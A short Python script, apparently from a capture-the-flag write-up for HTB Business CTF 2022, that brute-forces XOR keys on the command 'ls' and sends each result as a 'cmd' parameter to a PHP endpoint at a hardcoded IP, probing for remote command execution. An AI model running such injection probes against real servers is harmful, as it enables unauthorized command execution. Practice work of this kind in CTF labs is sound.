#https://fascinating-confusion.io/posts/2022/07/htb-business-ctf-22-superfast-writeup/

import requests

url = "http://188.166.175.58:32212/index.php?cmd={}"

for key in range(1, 256):
    # Modify the string based on the key (XOR operation)
    string = ''.join(chr(ord(char) ^ key) for char in "ls")
    
    # Send HTTP GET request with the modified string
    response = requests.get(url.format(string))
    
    # Print the response status code and content
    print(f"Key: {key}, Response: {response.status_code}, Content: {response.text}")

